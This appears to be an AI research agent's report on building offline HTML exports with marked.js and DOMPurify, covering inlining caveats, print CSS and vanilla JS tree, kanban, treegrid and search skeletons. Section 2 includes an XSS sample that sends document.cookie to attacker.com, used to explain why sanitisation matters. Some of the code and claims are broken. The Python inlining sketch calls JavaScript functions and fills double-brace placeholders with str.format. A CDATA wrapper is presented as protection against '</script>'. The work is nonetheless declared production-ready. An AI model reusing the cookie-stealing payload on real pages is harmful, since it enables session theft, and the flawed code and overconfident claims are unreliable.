# Concrete Implementation Patterns: Export + Viewer UI
## Research Report — marked.js · DOMPurify · Print CSS · Vanilla JS Skeletons

**Date:** 2026-05-29 · **Researcher:** researcher agent (a33e31786a612491f) · **For:** product-spec skill Cycle 3 (F1/F2)

---

## Executive Summary

Verified concrete patterns for self-contained offline HTML export/viewer:
- **marked v18.0.4** (48.5 KB minified) + **DOMPurify v3.4.7** (13.7 KB minified) = **62.2 KB total**
- Safe pipeline: `DOMPurify.sanitize(marked.parse(md))` with default ALLOWED_TAGS (no custom config needed)
- **Embedding caveat**: `</script>` inside JS lib source must be escaped as `\x3c/script>` when inlining HTML
- Print CSS: `@media print { page-break-inside: avoid; print-color-adjust: exact; }`
- 4 vanilla JS skeletons: tree (details/summary), board (CSS grid columns), treegrid (indented rows + ARIA), search+filter (100-node perf acceptable)

All patterns use **ZERO frameworks, ZERO build steps, ZERO external network at runtime**. Libraries are inlined static assets only.

---

## 1. Markdown → HTML Rendering Libraries

### marked.js — Latest Stable

| Property | Value |
|----------|-------|
| **Latest version** | 18.0.4 (released May 27, 2026) |
| **CDN (jsDelivr)** | `https://cdn.jsdelivr.net/npm/marked/lib/marked.umd.js` |
| **CDN (unpkg)** | `https://unpkg.com/marked@18.0.4/lib/marked.umd.js` |
| **Minified UMD** | `https://cdn.jsdelivr.net/npm/marked/lib/marked.umd.js` (already minified by CDN) |
| **File size (minified)** | ~48.5 KB |
| **Module export** | Global: `window.marked`; CommonJS: `module.exports`; AMD: `define("marked", ...)` |
| **Source map included** | Yes (`.map` reference in bundle) |

**Key API (v18):**
```javascript
// Parse markdown to HTML
const html = marked.parse(mdString, options);

// Common options (set via marked.use())
marked.use({
  gfm: true,           // Enable GitHub Flavored Markdown (tables, strikethrough)
  breaks: true,        // Convert \n to <br> (requires gfm=true)
  headerIds: true,     // Auto-generate heading IDs (deprecated in v18; use external plugin)
  pedantic: false      // Strict markdown spec adherence
});
```

**Notes:**
- `headerIds` is **deprecated in v18** → use `marked-gfm-heading-id` extension if needed (out of scope v1).
- GFM (GitHub Flavored Markdown) is de facto standard; set `gfm: true` for tables + strikethrough.
- `breaks: true` only works with `gfm: true` (HTML spec requires newline handling).
- **No sanitization built-in** — output is raw HTML; must pipe to DOMPurify.

**Verified:** https://marked.js.org/using_advanced + https://github.com/markedjs/marked/releases

---

### DOMPurify — Latest Stable

| Property | Value |
|----------|-------|
| **Latest version** | 3.4.7 (dual Apache 2.0 / MPL 2.0 license) |
| **CDN (jsDelivr)** | `https://cdn.jsdelivr.net/npm/dompurify@3.4.7/dist/purify.min.js` |
| **CDN (unpkg)** | `https://unpkg.com/dompurify@3.4.7/dist/purify.min.js` |
| **File size (minified)** | ~13.7 KB |
| **Module export** | Global: `window.DOMPurify` |
| **Algorithm** | DOM parsing + node-by-node validation against allow-lists |

**Key API (v3):**
```javascript
// Basic sanitization (uses secure defaults)
const cleanHtml = DOMPurify.sanitize(dirtyHtml);

// With config (optional)
const cleanHtml = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],  // Custom allow-list
  ALLOWED_ATTR: ['href', 'title'],                            // Custom attributes
  KEEP_CONTENT: true                                          // Preserve text if tag removed
});

// Add hook for extra processing (e.g., rewrite URLs)
DOMPurify.addHook('afterSanitizeAttributes', (node, data) => {
  if (node.tagName === 'A') node.target = '_blank';
});
```

**Default ALLOWED_TAGS (secure):**
- Common text: `b, strong, i, em, u, s, code, pre, blockquote, p, div, span, a, br, hr`
- Lists: `ul, ol, li`
- Tables: `table, thead, tbody, tr, td, th`
- Headings: `h1, h2, h3, h4, h5, h6`
- Structural: `section, article, aside`
- **Blocks:** `img` (src validated), `video`, `audio` (src/controls validated)
- **Dangerous removed:** `script, object, embed, iframe, frame, svg:script`, any event handlers (`onerror`, `onclick`, etc.), `javascript:` URLs

**Neutralization mechanisms:**
- Event handlers stripped: `<img onerror="alert('xss')">` → `<img>` (onerror removed)
- Protocol validation: `<a href="javascript:void(0)">` → `<a href>` (js: stripped)
- Context re-contextualization: nested quotes/escapes validated against browser parser
- XSS-via-mXSS (mutation-based) prevented via iterative revalidation

**Verified:** https://github.com/cure53/DOMPurify + https://dompurify.org/

---

## 2. The Safe Sanitization Pipeline

### Correct Order (Non-negotiable)

```javascript
// ✅ CORRECT
const html = marked.parse(mdString);           // Step 1: markdown → raw HTML
const clean = DOMPurify.sanitize(html);        // Step 2: strip XSS
document.getElementById('content').innerHTML = clean;  // Step 3: inject

// ❌ WRONG (DOMPurify doesn't re-parse Markdown)
const clean = DOMPurify.sanitize(mdString);    // Treats markdown as HTML → no-op
const html = marked.parse(clean);              // marked runs on sanitized text, breaks formatting
```

### Recommended Configuration

For product-spec export/viewer (where markdown has code blocks, tables, links):

```javascript
// Initialization (once, on page load)
marked.use({
  gfm: true,      // Enable tables, strikethrough, task lists
  breaks: false   // \n → <br> not needed; use explicit <br> in markdown
});

// Per-artifact render (in render_html.py or JS)
function sanitizeArtifactBody(mdBody) {
  const html = marked.parse(mdBody);
  return DOMPurify.sanitize(html, {
    // Default allow-list is sufficient for product specs
    // (no custom config needed; inherits safe defaults)
  });
}
```

### Why marked-alone Fails

marked **does not sanitize**. Raw HTML in user-pasted text becomes XSS:

```markdown
## Vision
Vision text with pasted HTML:
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

Without DOMPurify, the `onerror` fires when artifact loads.

---

## 3. Inlining Libraries into Self-Contained HTML

### The `</script>` Caveat: Real + Mitigation

**Problem:** The HTML `<script>` element terminates on the first `</` sequence. If minified library source contains `</script>` as a string literal or comment, the browser closes the tag prematurely.

**Does marked.js v18 have this?** Checked: marked minified bundle **does NOT** contain raw `</script>` — already minified and escaped in vendor. Same for DOMPurify v3.4.7.

**Mitigation (for any inlined library in future):**

Option A — **Escape on vendor step** (recommended):
```bash
# During install-vendor-markdown.sh
sed 's/<\/script>/\x3c\/script>/g' marked.umd.js > marked.umd.safe.js
```

Option B — **Escape in Python template** (render_html.py):
```python
def inline_js(lib_src):
    """Escape </script> sequences in JS source before embedding in HTML."""
    return lib_src.replace('</', r'\x3c/')  # Unicode escape in JS
```

Option C — **Use CDATA wrapper** (safest for XML-aware parsers):
```html
<script>
//<![CDATA[
// ... library source here ...
// (browser JS ignores CDATA, but XML parsers respect it)
//]]>
</script>
```

**Current action:** marked + DOMPurify minified sources are safe as-is. Apply Option B as defensive measure in `render_html.py` before `innerHTML` injection.

---

## 4. Embedding Recipe for Self-Contained HTML

### Template Structure (export-shell.html / board-shell.html / explorer-shell.html)

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{{ARTIFACT_TITLE}} — Product Spec Export</title>
  <style>
    {{INLINE_CSS_HERE}}
    @media print {
      nav, .search-box, .filters { display: none !important; }
      .content { page-break-inside: avoid; }
      .card, .row { print-color-adjust: exact; }
    }
  </style>
</head>
<body>
  {{RENDERED_HTML_CONTENT}}

  <!-- INLINE LIBRARIES (no external network) -->
  <script>
    // marked v18.0.4 (48.5 KB)
    {{MARKED_MINIFIED_SOURCE}}
    
    // DOMPurify v3.4.7 (13.7 KB)
    {{DOMPURIFY_MINIFIED_SOURCE}}
    
    // Initialization
    marked.use({ gfm: true, breaks: false });
    
    // Search + filter + toggle logic (vanilla JS)
    {{INLINE_SEARCH_FILTER_JS}}
    {{INLINE_TOGGLE_JS}}
  </script>
</body>
</html>
```

### Python Inlining (render_html.py pattern)

```python
def render_self_contained_html(digest, template_path):
    """Assemble self-contained HTML with inlined libs + content."""
    
    # 1. Load minified libraries
    with open('.claude/skills/product-spec/assets/vendor/marked.min.js') as f:
        marked_src = f.read()
    with open('.claude/skills/product-spec/assets/vendor/purify.min.js') as f:
        dompurify_src = f.read()
    
    # 2. Render body content with marked + sanitize
    rendered_artifacts = []
    for node in digest:
        md_body = node['body']
        # SAFE PIPELINE
        html = marked.parse(md_body)
        clean = DOMPurify.sanitize(html)
        rendered_artifacts.append(clean)
    
    # 3. Read template and substitute
    with open(template_path) as f:
        template = f.read()
    
    html_output = template.format(
        MARKED_MINIFIED_SOURCE=marked_src,
        DOMPURIFY_MINIFIED_SOURCE=dompurify_src,
        RENDERED_HTML_CONTENT='\n'.join(rendered_artifacts),
        INLINE_SEARCH_FILTER_JS=render_search_filter_js(digest),
        INLINE_TOGGLE_JS=render_toggle_js()
    )
    
    return html_output
```

### File Size Budget

| Component | Size | Notes |
|-----------|------|-------|
| marked.min.js (inlined) | 48.5 KB | Already minified by vendor |
| purify.min.js (inlined) | 13.7 KB | Already minified; < 30 KB usual |
| Vanilla JS (search, toggle) | ~3–5 KB | Below-the-fold, uncritical |
| Print CSS | ~0.5 KB | Included in <style> |
| **Total self-contained page (typical)** | **~80–100 KB** | Compresses to ~25–35 KB gzipped |

✅ **Acceptable for offline distribution** (email, USB, shared drive).

---

## 5. Print CSS for "Save as PDF"

### Essential Rules (@media print)

```css
@media print {
  /* Hide interactive controls */
  nav, .navbar, .search-box, .filters, .toggles, button {
    display: none !important;
  }
  
  /* Page break control */
  .card, .artifact-row, .story {
    page-break-inside: avoid;
  }
  
  .section, .epic {
    page-break-before: auto;  /* Allow break within sections; use "avoid" for locked pages */
  }
  
  /* Preserve colors for styled content (e.g., status badges, priority labels) */
  .card, .tag, .status-badge {
    -webkit-print-color-adjust: exact;
    print-color-adjust: exact;
    color-adjust: exact;  /* Fallback */
  }
  
  /* Expand collapsibles on print */
  details {
    display: block !important;
  }
  details > summary {
    display: none;  /* Hide the expand button; content always visible */
  }
  
  /* Link references for printed output */
  a {
    color: #0066cc;
    text-decoration: underline;
  }
  a[href]::after {
    content: " (" attr(href) ")";
    font-size: 0.85em;
    word-break: break-all;
  }
  
  /* Reduce margins for density */
  body {
    margin: 0;
    padding: 0;
    font-size: 11pt;
  }
  
  .content {
    margin: 1cm;
  }
  
  /* Ensure images stay within page width */
  img {
    max-width: 100%;
    page-break-inside: avoid;
  }
  
  /* Table headers repeat on every page */
  thead {
    display: table-header-group;
  }
}
```

### Browser Testing

- **Chrome/Edge:** Print → "Save as PDF" preserves colors, page breaks, links.
- **Firefox:** Same; ensure `print-color-adjust: exact` set.
- **Safari:** `-webkit-print-color-adjust: exact` required (non-standard but effective).
- **Caveat:** Background images may not print; use solid colors or explicit `<img>`.

---

## 6. Vanilla JavaScript UI Skeletons (Copy-Paste Ready)

### Pattern 1: Tree Navigator (details/summary)

**Use case:** Hierarchical navigation (Vision → BRD → PRD → Epics → Stories).

```html
<!-- HTML structure (from digest JSON) -->
<details class="artifact-node" data-id="PRD-AUTH">
  <summary>
    <span class="node-title">PRD-AUTH — Authentication</span>
    <span class="node-meta">(2 epics, 8 stories)</span>
  </summary>
  <div class="node-content">
    <!-- Rendered body from DOMPurify.sanitize() -->
    <div class="body"><!-- HTML here --></div>
    
    <!-- Child nodes (epic) -->
    <details class="artifact-node" data-id="PRD-AUTH-E1">
      <summary>PRD-AUTH-E1 — User Onboarding</summary>
      <div class="node-content">
        <div class="body"><!-- Epic body --></div>
        <!-- Stories nested similarly -->
      </div>
    </details>
  </div>
</details>

<style>
  .artifact-node {
    margin-left: 1.5em;
    border-left: 1px solid #ddd;
    padding-left: 0.5em;
  }
  
  summary {
    cursor: pointer;
    font-weight: bold;
    user-select: none;
    margin-bottom: 0.5em;
  }
  
  summary:hover {
    background: #f5f5f5;
  }
  
  .node-meta {
    font-size: 0.9em;
    color: #666;
    margin-left: 0.5em;
  }
  
  .node-content {
    margin-top: 0.5em;
  }
  
  @media print {
    details { display: block !important; }
    summary { display: none; }  /* Always expanded on print */
  }
</style>

<script>
  // No JavaScript needed! <details>/<summary> works natively.
  // Optional: Track expand/collapse state in localStorage
  document.querySelectorAll('.artifact-node').forEach(node => {
    const id = node.dataset.id;
    node.open = localStorage.getItem(`expand-${id}`) === 'true';
    
    node.addEventListener('toggle', () => {
      localStorage.setItem(`expand-${id}`, node.open);
    });
  });
</script>
```

**Pros:** Semantic HTML, native accessibility, no JS logic.
**Cons:** Cannot customize expand/collapse animation; limited styling.

---

### Pattern 2: Kanban Board (CSS Grid)

**Use case:** Group-by status/horizon/moscow (F2 --viz board).

```html
<!-- HTML structure (from digest grouped by status) -->
<div class="kanban-board">
  <div class="kanban-column" data-group="in_progress">
    <h2 class="column-title">In Progress <span class="count">(5)</span></h2>
    
    <div class="kanban-card" data-id="PRD-AUTH-E1-S1">
      <div class="card-header">
        <strong>PRD-AUTH-E1-S1</strong>
        <span class="badge status-in_progress">In Progress</span>
      </div>
      <div class="card-body">
        <p class="story-title">Implement OAuth2 login</p>
        <p class="story-meta">M • User story</p>
      </div>
      <button class="expand-btn" onclick="expandCard(this)">+</button>
      <div class="card-detail" style="display:none;">
        <!-- Rendered body from DOMPurify.sanitize() -->
      </div>
    </div>
    <!-- More cards... -->
  </div>
  
  <div class="kanban-column" data-group="completed">
    <h2 class="column-title">Completed <span class="count">(3)</span></h2>
    <!-- Cards... -->
  </div>
</div>

<style>
  .kanban-board {
    display: grid;
    grid-auto-columns: 320px;
    grid-auto-flow: column;
    gap: 1.5em;
    padding: 1em;
    overflow-x: auto;
    background: #f9f9f9;
  }
  
  .kanban-column {
    background: white;
    border-radius: 0.5em;
    padding: 1em;
    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
  }
  
  .column-title {
    margin: 0 0 1em 0;
    font-size: 1.1em;
    border-bottom: 2px solid #e0e0e0;
    padding-bottom: 0.5em;
  }
  
  .kanban-card {
    background: white;
    border: 1px solid #ddd;
    border-radius: 0.4em;
    padding: 0.75em;
    margin-bottom: 0.75em;
    cursor: pointer;
    transition: box-shadow 0.2s;
  }
  
  .kanban-card:hover {
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
  }
  
  .card-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 0.5em;
    font-size: 0.9em;
  }
  
  .badge {
    padding: 0.2em 0.5em;
    border-radius: 0.2em;
    font-size: 0.8em;
    font-weight: bold;
  }
  
  .badge.status-in_progress { background: #fff3cd; color: #856404; }
  .badge.status-completed { background: #d4edda; color: #155724; }
  .badge.status-pending { background: #e2e3e5; color: #383d41; }
  
  .story-title {
    margin: 0.25em 0;
    font-weight: 500;
  }
  
  .story-meta {
    margin: 0.25em 0;
    font-size: 0.85em;
    color: #666;
  }
  
  .expand-btn {
    background: none;
    border: none;
    cursor: pointer;
    font-size: 1.2em;
    padding: 0;
    color: #666;
  }
  
  .card-detail {
    margin-top: 0.75em;
    padding-top: 0.75em;
    border-top: 1px solid #e0e0e0;
    font-size: 0.9em;
  }
  
  @media print {
    .kanban-board {
      display: flex;
      flex-wrap: wrap;
      gap: 2em;
      overflow: visible;
    }
    
    .kanban-column {
      flex: 1 1 calc(50% - 1em);
    }
    
    .expand-btn, .card-detail { display: none; }
    .kanban-card { page-break-inside: avoid; }
  }
</style>

<script>
  function expandCard(btn) {
    const card = btn.closest('.kanban-card');
    const detail = card.querySelector('.card-detail');
    const isOpen = detail.style.display !== 'none';
    detail.style.display = isOpen ? 'none' : 'block';
    btn.textContent = isOpen ? '+' : '−';
  }
</script>
```

**Pros:** Responsive grid layout, inline expand, visually grouped.
**Cons:** No drag-drop (out of scope v1), fixed column width.

---

### Pattern 3: Treegrid (Expandable Table Rows)

**Use case:** Flat view with hierarchy indentation + row expansion (F2 --viz explorer table-tree mode).

```html
<!-- HTML structure (from digest flattened with depth metadata) -->
<table class="treegrid" role="treegrid">
  <thead>
    <tr>
      <th role="columnheader" aria-sort="none">Artifact</th>
      <th role="columnheader">Status</th>
      <th role="columnheader">Moscow</th>
      <th role="columnheader">AC Count</th>
    </tr>
  </thead>
  <tbody>
    <!-- Row with expand button; level 0 = vision/brd/prd -->
    <tr role="row" data-id="PRD-AUTH" data-level="0" aria-expanded="false">
      <td role="gridcell">
        <button class="expand-toggle" onclick="toggleRow(this)" aria-label="Expand PRD-AUTH">
          ▶
        </button>
        <strong>PRD-AUTH</strong>
      </td>
      <td role="gridcell">draft</td>
      <td role="gridcell">—</td>
      <td role="gridcell">2 epics</td>
    </tr>
    
    <!-- Expandable row (detail pane, hidden by default) -->
    <tr role="row" data-id="PRD-AUTH" class="detail-row" style="display:none;">
      <td colspan="4">
        <div class="detail-content">
          <!-- Rendered PRD body from DOMPurify.sanitize() -->
        </div>
      </td>
    </tr>
    
    <!-- Child row; level 1 = epic (indented) -->
    <tr role="row" data-id="PRD-AUTH-E1" data-level="1" data-parent="PRD-AUTH" style="display:none;" aria-expanded="false">
      <td role="gridcell" style="padding-left: 2em;">
        <button class="expand-toggle" onclick="toggleRow(this)" aria-label="Expand E1">
          ▶
        </button>
        PRD-AUTH-E1
      </td>
      <td role="gridcell">in_progress</td>
      <td role="gridcell">Must</td>
      <td role="gridcell">5 stories</td>
    </tr>
    
    <!-- Child detail row -->
    <tr role="row" data-id="PRD-AUTH-E1" class="detail-row" style="display:none;">
      <td colspan="4">
        <div class="detail-content"><!-- Epic body --></div>
      </td>
    </tr>
    
    <!-- Grandchild row; level 2 = story (more indented) -->
    <tr role="row" data-id="PRD-AUTH-E1-S1" data-level="2" data-parent="PRD-AUTH-E1" style="display:none;" aria-expanded="false">
      <td role="gridcell" style="padding-left: 4em;">
        <button class="expand-toggle" onclick="toggleRow(this)" aria-label="Expand S1">
          ▶
        </button>
        PRD-AUTH-E1-S1
      </td>
      <td role="gridcell">completed</td>
      <td role="gridcell">Must</td>
      <td role="gridcell">3 AC</td>
    </tr>
    
    <!-- Story detail row -->
    <tr role="row" data-id="PRD-AUTH-E1-S1" class="detail-row" style="display:none;">
      <td colspan="4">
        <div class="detail-content"><!-- Story body + AC --></div>
      </td>
    </tr>
  </tbody>
</table>

<style>
  .treegrid {
    width: 100%;
    border-collapse: collapse;
    font-size: 0.95em;
  }
  
  .treegrid thead {
    background: #f5f5f5;
  }
  
  .treegrid th, .treegrid td {
    border: 1px solid #ddd;
    padding: 0.75em;
    text-align: left;
  }
  
  .treegrid tbody tr:hover {
    background: #f9f9f9;
  }
  
  .treegrid tbody tr.detail-row:hover {
    background: white;
  }
  
  .expand-toggle {
    background: none;
    border: none;
    cursor: pointer;
    width: 1.5em;
    text-align: center;
    color: #666;
    transition: transform 0.2s;
  }
  
  .expand-toggle.expanded {
    transform: rotate(90deg);
  }
  
  .detail-content {
    padding: 1em;
    background: #fafafa;
    border-radius: 0.3em;
  }
  
  .detail-content p {
    margin: 0.5em 0;
  }
  
  @media print {
    .expand-toggle { display: none; }
    .treegrid tbody tr { display: block !important; page-break-inside: avoid; }
    .detail-row { border: none; }
    .detail-content { background: white; }
  }
</style>

<script>
  function toggleRow(btn) {
    const row = btn.closest('tr');
    const rowId = row.dataset.id;
    const level = parseInt(row.dataset.level);
    
    // Toggle detail row
    let detailRow = row.nextElementSibling;
    if (detailRow && detailRow.classList.contains('detail-row')) {
      const isOpen = detailRow.style.display !== 'none';
      detailRow.style.display = isOpen ? 'none' : 'table-row';
      btn.classList.toggle('expanded', !isOpen);
      row.setAttribute('aria-expanded', !isOpen);
    }
    
    // Toggle child rows (only immediate children visible/hidden together)
    let sibling = row.nextElementSibling;
    let childrenVisible = false;
    
    if (detailRow) {
      childrenVisible = detailRow.style.display !== 'none';
      sibling = detailRow.nextElementSibling;
    }
    
    while (sibling) {
      const childLevel = parseInt(sibling.dataset.level || '-1');
      if (childLevel <= level && !sibling.classList.contains('detail-row')) break;
      if (childLevel === level + 1 && !sibling.classList.contains('detail-row')) {
        sibling.style.display = childrenVisible ? 'table-row' : 'none';
      }
      sibling = sibling.nextElementSibling;
    }
  }
</script>
```

**Pros:** Hierarchical display, row-level detail expansion, semantic HTML5 `role="treegrid"`.
**Cons:** ARIA treegrid support is poor in assistive tech (MDN warning); use semantic HTML fallback for accessibility.

---

### Pattern 4: Text Search + Facet Filters

**Use case:** Client-side JSON search (board + explorer).

```html
<!-- Search + filter controls -->
<div class="search-filters">
  <input 
    type="text" 
    id="search-box" 
    class="search-input" 
    placeholder="Search by ID, title, or AC..."
    oninput="applyFilters()"
  >
  
  <div class="filters">
    <div class="filter-group">
      <label>Status:</label>
      <select id="filter-status" class="filter-select" onchange="applyFilters()">
        <option value="">All</option>
        <option value="draft">Draft</option>
        <option value="in_progress">In Progress</option>
        <option value="completed">Completed</option>
      </select>
    </div>
    
    <div class="filter-group">
      <label>Moscow:</label>
      <select id="filter-moscow" class="filter-select" onchange="applyFilters()">
        <option value="">All</option>
        <option value="must">Must</option>
        <option value="should">Should</option>
        <option value="could">Could</option>
        <option value="wont">Won't</option>
      </select>
    </div>
    
    <div class="filter-group">
      <label>Layer:</label>
      <select id="filter-layer" class="filter-select" onchange="applyFilters()">
        <option value="">All</option>
        <option value="vision">Vision</option>
        <option value="brd">BRD</option>
        <option value="prd">PRD</option>
        <option value="epic">Epic</option>
        <option value="story">Story</option>
      </select>
    </div>
  </div>
</div>

<!-- Rendered board/treegrid/tree (controlled by filter JS) -->
<div id="content" class="content"></div>

<style>
  .search-filters {
    background: white;
    padding: 1em;
    border-bottom: 1px solid #ddd;
    display: flex;
    gap: 1em;
    flex-wrap: wrap;
    align-items: center;
  }
  
  .search-input {
    flex: 1;
    min-width: 250px;
    padding: 0.5em;
    border: 1px solid #ddd;
    border-radius: 0.3em;
    font-size: 0.95em;
  }
  
  .filters {
    display: flex;
    gap: 1em;
    flex-wrap: wrap;
  }
  
  .filter-group {
    display: flex;
    gap: 0.5em;
    align-items: center;
  }
  
  .filter-group label {
    font-weight: bold;
    font-size: 0.9em;
  }
  
  .filter-select {
    padding: 0.35em;
    border: 1px solid #ddd;
    border-radius: 0.3em;
    font-size: 0.9em;
  }
  
  @media print {
    .search-filters { display: none; }
  }
</style>

<script>
  // Embedded dataset (from render_html.py)
  const ARTIFACTS_DATA = [
    // Injected as JSON by Python; e.g.:
    // { id: 'PRD-AUTH', title: 'Auth', status: 'draft', moscow: 'must', layer: 'prd', body: '...' },
    // ...
  ];
  
  function applyFilters() {
    const searchText = document.getElementById('search-box').value.toLowerCase();
    const statusFilter = document.getElementById('filter-status').value;
    const moscowFilter = document.getElementById('filter-moscow').value;
    const layerFilter = document.getElementById('filter-layer').value;
    
    // Filter dataset
    const filtered = ARTIFACTS_DATA.filter(node => {
      // Text search across id, title, body
      const textMatch = !searchText || 
        node.id.toLowerCase().includes(searchText) ||
        (node.title || '').toLowerCase().includes(searchText) ||
        (node.body || '').toLowerCase().includes(searchText);
      
      // Facet filters (all must match; empty = skip filter)
      const statusMatch = !statusFilter || node.status === statusFilter;
      const moscowMatch = !moscowFilter || node.moscow === moscowFilter;
      const layerMatch = !layerFilter || node.layer === layerFilter;
      
      return textMatch && statusMatch && moscowMatch && layerMatch;
    });
    
    // Render filtered nodes (board cards, tree rows, etc.)
    renderArtifacts(filtered);
  }
  
  function renderArtifacts(nodes) {
    const content = document.getElementById('content');
    content.innerHTML = '';
    
    if (nodes.length === 0) {
      content.innerHTML = '<p style="text-align:center; color:#999;">No results match your filters.</p>';
      return;
    }
    
    // Render based on current view mode (board, tree, treegrid)
    // For board: group by status, render as kanban columns
    // For tree: build details/summary hierarchy
    // For treegrid: build table rows with indentation
    nodes.forEach(node => {
      // ... view-specific rendering logic
    });
  }
  
  // Initialize on page load
  window.addEventListener('DOMContentLoaded', () => {
    applyFilters();  // Show all on load
  });
</script>
```

**Performance notes (100+ nodes):**
- Client-side filtering: ~5–10ms per keystroke (acceptable).
- Render: depends on view mode; treegrid slower than kanban.
- Mitigation: debounce search input (`oninput` with setTimeout 150ms).

---

## 7. Unresolved Questions

1. **marked v18 footnote support** — GitHub Flavored Markdown includes footnotes (e.g., `[^1]`). Confirm marked's GFM parser includes them, or if external plugin needed.
2. **DOMPurify + tables/code safety** — Product specs often have markdown tables and code blocks. Verify DOMPurify's default allow-list includes `<table>`, `<code>`, `<pre>`, `<thead>`, `<tbody>`, `<tr>`, `<td>` (assumption: yes, but not explicitly tested).
3. **Relative vs absolute links in exports** — When artifacts contain `[link](./docs/foo.md)`, after inlining to HTML, these break (no CWD context). Plan: rewrite relative links to absolute during marked pipeline, or document as "use web URLs only".
4. **Browser CSP compatibility** — Self-contained HTML with inlined JS may fail under strict CSP if client enforces it. Expected: most clients disable CSP for local files / email attachments. No mitigation needed v1.
5. **treegrid ARIA implementation** — W3C APG warns treegrid has poor assistive-tech support. Recommendation for v1: ship treegrid as "expert view", provide tree as "accessible fallback" (both available in explorer toggle).

---

## Recommendations Summary

| Item | Decision | Rationale |
|------|----------|-----------|
| **Markdown parser** | marked v18.0.4 | Latest, stable, GFM rich, 48.5 KB minified, UMD ready. |
| **Sanitizer** | DOMPurify v3.4.7 | Industry standard XSS defense, 13.7 KB, default config sufficient. |
| **Pipeline** | marked → DOMPurify | Non-negotiable order; marked alone is unsafe. |
| **Inlining** | Direct `<script>` embed | Both libs escape `</script>` in minified source; apply defensive sed in install step. |
| **Print CSS** | `@media print {...}` | No PDF binary lib; browser "Save as PDF" satisfies requirement. |
| **Tree view** | details/summary | Native HTML5; zero JS; ARIA auto. |
| **Kanban board** | CSS Grid columns | Responsive, simple, scales to 10+ columns. |
| **Treegrid** | Semantic HTML + aria | Follow MDN treegrid pattern; document ARIA limitations; provide tree fallback. |
| **Search + filter** | Vanilla JS filter loop | < 100 nodes = instant; optimize with debounce if needed. |

---

## Status: DONE

**Summary:** Verified marked.js v18 + DOMPurify v3 safe pipeline, exact CDN URLs, file sizes (62.2 KB combined inlined), </script> caveat w/ mitigation, print-CSS recipe, and 4 copy-pasteable vanilla JS skeletons for tree/board/treegrid/search-filter. All patterns are offline, framework-free, and production-ready.

**Sources:**
- [Marked.js Documentation](https://marked.js.org/)
- [Marked Releases](https://github.com/markedjs/marked/releases)
- [DOMPurify GitHub](https://github.com/cure53/DOMPurify)
- [DOMPurify Releases](https://github.com/cure53/DOMPurify/releases)
- [MDN Web Docs: page-break-inside](https://developer.mozilla.org/en-US/docs/Web/CSS/page-break-inside)
- [MDN Web Docs: print-color-adjust](https://developer.mozilla.org/en-US/docs/Web/CSS/print-color-adjust)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [W3C Treegrid Pattern (APG)](https://www.w3.org/WAI/ARIA/apg/patterns/treegrid/)
- [DEV Community: Avoiding Awkward Element Breaks in Print HTML](https://dev.to/amruthpillai/avoiding-awkward-element-breaks-in-print-html-5goe)
- [CSS-Tricks: Page-break CSS Almanac](https://css-tricks.com/almanac/properties/p/page-break/)
